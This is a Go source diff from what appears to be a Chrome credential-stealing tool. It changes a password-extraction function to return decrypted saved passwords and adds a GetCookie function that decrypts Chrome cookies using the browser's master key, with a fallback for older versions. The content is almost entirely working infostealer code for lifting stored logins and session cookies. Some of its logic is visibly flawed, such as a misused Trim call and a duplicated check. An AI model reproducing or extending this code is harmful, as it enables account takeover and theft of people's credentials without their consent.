@@ -131,11 +131,9 @@ func GetMasterKey(localStatePath string) ([]byte, error) {
 	return masterKey, nil
 }
 
-func GetInfo(info model.Info, path string, masterKey []byte) model.Info {
-	if strings.HasPrefix(info.Pass, "v10") { // Means it's chrome 80 or higher
-
+func GetInfo(info *model.Info, path string, masterKey []byte) *model.Info {
+	if strings.HasPrefix(info.Pass, "v10") {
 		info.Pass = strings.Trim(info.Pass, "v10")
-
 		//fmt.Println("Chrome Version is 80 or higher, switching to the AES 256 decrypt.")
 		if string(masterKey) != "" {
 			ciphertext := []byte(info.Pass)
@@ -160,10 +158,7 @@ func GetInfo(info model.Info, path string, masterKey []byte) model.Info {
 				fmt.Println(err)
 			}
 			if string(plaintext) != "" {
-				x := string(plaintext)
-				fmt.Println(info.Url, " | ", info.UserName, " | ", x)
-				//fmt.Println(URL," | ", USERNAME," | ", "**DEMO**")
-
+				return info
 			}
 		} else { // It the masterkey hasn't been requested yet, then gets it.
 			mkey, err := GetMasterKey(path)
@@ -179,11 +174,61 @@ func GetInfo(info model.Info, path string, masterKey []byte) model.Info {
 		}
 
 		if info.Url != "" && info.Url != "" && string(pass) != "" {
-			fmt.Println(info.Url, info.UserName, string(pass))
+			info.Pass = string(pass)
+			return info
 		}
+	}
+	return nil
+}
+
+func GetCookie(info *model.Cookie, path string, masterKey []byte) *model.Cookie {
+	if strings.HasPrefix(info.Value, "v10") { // Means it's chrome 80 or higher
+
+		info.Value = strings.Trim(info.Value, "v10")
+
+		//fmt.Println("Chrome Version is 80 or higher, switching to the AES 256 decrypt.")
+		if string(masterKey) != "" {
+			ciphertext := []byte(info.Value)
+			c, err := aes.NewCipher(masterKey)
+			if err != nil {
+
+				fmt.Println(err)
+			}
+			gcm, err := cipher.NewGCM(c)
+			if err != nil {
+				fmt.Println(err)
+			}
+			nonceSize := gcm.NonceSize()
+			if len(ciphertext) < nonceSize {
+				fmt.Println(err)
+			}
+
+			nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
+			plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
+			info.Value = string(plaintext)
+			if err != nil {
+				fmt.Println(err)
+			}
+			if string(plaintext) != "" {
+				return info
+			}
+
+		} else { // It the masterkey hasn't been requested yet, then gets it.
+			mkey, err := GetMasterKey(path)
+			if err != nil {
+				fmt.Println(err)
+			}
+			masterKey = mkey
+		}
+	} else { //Means it's chrome v. < 80
+		value, err := Decrypt([]byte(info.Value))
+		if err != nil {
+			log.Fatal(err)
+		}
+		info.Value = string(value)
+		return info
 	}
 
 	//Check if no value, if none skip
-	return info
-
+	return nil
 }
